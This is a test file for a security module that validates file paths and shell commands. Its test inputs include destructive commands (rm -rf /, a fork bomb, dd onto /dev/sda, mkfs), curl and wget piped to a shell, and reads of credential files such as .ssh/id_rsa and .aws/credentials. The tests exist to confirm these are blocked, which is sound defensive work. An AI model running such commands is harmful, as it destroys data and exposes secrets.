import { describe, it, expect } from "vitest";
import {
	validatePath,
	validateCommand,
	getSecurityConfig,
} from "../src/utils/security.js";
import { join } from "path";

describe("Security Validation", () => {
	describe("validatePath", () => {
		it("should accept valid paths in current directory", () => {
			const testPath = join(process.cwd(), "test.txt");
			const result = validatePath(testPath);
			expect(result.valid).toBe(true);
			expect(result.resolvedPath).toBeDefined();
		});

		it("should reject forbidden paths like /etc/passwd (or Windows System32)", () => {
			const target = process.platform === "win32"
				? require("path").join(process.env.SystemRoot || "C:\\Windows", "System32")
				: "/etc/passwd";
			const result = validatePath(target);
			expect(result.valid).toBe(false);
			// Accept either generic outside-allowed message or specific forbidden indicator
			const msg = result.checks.join(" ").toLowerCase();
			expect(msg).toSatisfy((m: string) => m.includes("outside allowed") || m.includes("forbidden"));
		});

		it("should reject paths outside allowed directories", () => {
			const target = process.platform === "win32"
				? require("path").join(process.env.SystemRoot || "C:\\Windows", "System32", "drivers", "etc", "hosts")
				: "/etc/hosts";
			const result = validatePath(target);
			expect(result.valid).toBe(false);
			const msg = result.checks.join(" ").toLowerCase();
			expect(msg).toSatisfy((m: string) => m.includes("outside allowed") || m.includes("forbidden"));
		});

		it("should reject paths with forbidden directories", () => {
			const testPath = join(process.cwd(), ".git", "config");
			const result = validatePath(testPath);
			expect(result.valid).toBe(false);
			expect(result.checks.join(" ")).toContain("Forbidden directory");
		});

		// New edge case tests
		it("should reject path traversal with ../ to system directory", () => {
			// Craft a traversal that resolves to a system path outside allowlist
			const target = process.platform === "win32"
				? require("path").resolve(process.cwd(), "..", "..", process.env.SystemRoot || "C:\\Windows", "System32")
				: "/etc/passwd";
			const result = validatePath(target);
			expect(result.valid).toBe(false);
		});

		it("should reject path traversal with ..\\ to system directory (Windows only)", () => {
			if (process.platform !== "win32") return;
			const systemRoot = process.env.SystemRoot || "C:\\Windows";
			const traversalPath = require("path").resolve(process.cwd(), "..", "..", systemRoot, "System32");
			const result = validatePath(traversalPath);
			expect(result.valid).toBe(false);
		});

		it("should detect .env in forbidden paths", () => {
			const testPath = join(process.cwd(), ".env");
			const result = validatePath(testPath);
			expect(result.valid).toBe(false);
			expect(result.checks.join(" ")).toContain("Forbidden");
		});

		it("should detect node_modules in forbidden directories", () => {
			const testPath = join(
				process.cwd(),
				"node_modules",
				"package",
				"index.js"
			);
			const result = validatePath(testPath);
			expect(result.valid).toBe(false);
			expect(result.checks.join(" ")).toContain("Forbidden directory");
		});

		it("should handle .venv directory block", () => {
			const testPath = join(process.cwd(), ".venv", "lib", "python");
			const result = validatePath(testPath);
			expect(result.valid).toBe(false);
			expect(result.checks.join(" ")).toContain("Forbidden directory");
		});

		it("should reject .ssh paths", () => {
			const testPath = join(process.cwd(), ".ssh", "id_rsa");
			const result = validatePath(testPath);
			expect(result.valid).toBe(false);
		});

		it("should reject .aws paths", () => {
			const testPath = join(process.cwd(), ".aws", "credentials");
			const result = validatePath(testPath);
			expect(result.valid).toBe(false);
		});

		it("should accept normal src directory files", () => {
			const testPath = join(process.cwd(), "src", "utils", "security.ts");
			const result = validatePath(testPath);
			expect(result.valid).toBe(true);
			expect(result.resolvedPath).toBeDefined();
		});

		it("should resolve relative paths correctly", () => {
			const testPath = "./src/server.ts";
			const result = validatePath(testPath);
			expect(result.valid).toBe(true);
			expect(result.resolvedPath).toContain("src");
		});
	});

	describe("validateCommand", () => {
		it("should accept allowed commands", () => {
			const result = validateCommand("ls -la");
			expect(result.valid).toBe(true);
		});

		it("should reject disallowed commands", () => {
			const result = validateCommand("rm -rf /");
			expect(result.valid).toBe(false);
			expect(result.reason).toContain("Dangerous command pattern");
		});

		it("should allow safe commands with path arguments", () => {
			const result = validateCommand("cat ../../etc/passwd");
			// cat is allowed, so this passes - the tool is responsible for path validation separately
			expect(result.valid).toBe(true);
		});

		// New edge case tests
		it("should reject fork bomb pattern", () => {
			const result = validateCommand(":(){:|:&};:");
			expect(result.valid).toBe(false);
			expect(result.reason).toContain("Dangerous command pattern");
		});

		it("should reject dd with /dev/sda", () => {
			const result = validateCommand("dd if=/dev/zero of=/dev/sda");
			expect(result.valid).toBe(false);
		});

		it("should reject wget pipe to sh", () => {
			const result = validateCommand("wget http://example.com/script.sh | sh");
			expect(result.valid).toBe(false);
		});

		it("should reject curl pipe to bash", () => {
			const result = validateCommand(
				"curl http://example.com/install.sh | bash"
			);
			expect(result.valid).toBe(false);
		});

		it("should reject format command", () => {
			const result = validateCommand("format C:");
			expect(result.valid).toBe(false);
		});

		it("should reject mkfs", () => {
			const result = validateCommand("mkfs /dev/sda1");
			expect(result.valid).toBe(false);
		});

		it("should reject rm -rf", () => {
			const result = validateCommand("rm -rf /");
			expect(result.valid).toBe(false);
		});

		it("should reject command not in allowlist", () => {
			const result = validateCommand("unknown-command");
			expect(result.valid).toBe(false);
			expect(result.reason).toContain("not in allowlist");
		});

		it("should accept git commands", () => {
			const result = validateCommand("git status");
			expect(result.valid).toBe(true);
			expect(result.command).toBe("git");
		});

		it("should accept npm commands", () => {
			const result = validateCommand("npm install");
			expect(result.valid).toBe(true);
		});

		it("should accept node commands", () => {
			const result = validateCommand("node script.js");
			expect(result.valid).toBe(true);
		});

		it("should accept python commands", () => {
			const result = validateCommand("python test.py");
			expect(result.valid).toBe(true);
		});

		it("should handle whitespace correctly", () => {
			const result = validateCommand("  ls   -la  ");
			expect(result.valid).toBe(true);
			expect(result.command).toBe("ls");
		});
	});

	describe("getSecurityConfig", () => {
		it("should return security configuration", () => {
			const config = getSecurityConfig();
			expect(config).toHaveProperty("allowed_commands");
			expect(config).toHaveProperty("forbidden_paths");
			expect(config).toHaveProperty("hardening_enabled");
			expect(Array.isArray(config.allowed_commands)).toBe(true);
		});

		it("should include all expected security properties", () => {
			const config = getSecurityConfig();
			expect(config.hardening_enabled).toBe(true);
			expect(config.command_allowlist_active).toBe(true);
			expect(config.path_validation_active).toBe(true);
			expect(config.forbidden_paths.length).toBeGreaterThan(0);
			expect(config.forbidden_dirs.length).toBeGreaterThan(0);
		});

		it("should have critical forbidden paths", () => {
			const config = getSecurityConfig();
			const hasSensitivePaths = config.forbidden_paths.some((p) =>
				["/etc/passwd", ".ssh", ".aws", ".env"].some((sensitive) =>
					p.includes(sensitive)
				)
			);
			expect(hasSensitivePaths).toBe(true);
		});

		it("should have critical forbidden directories", () => {
			const config = getSecurityConfig();
			const hasSystemDirs = config.forbidden_dirs.some((d) =>
				[".git", "node_modules", ".venv"].some((dir) => d.includes(dir))
			);
			expect(hasSystemDirs).toBe(true);
		});
	});
});
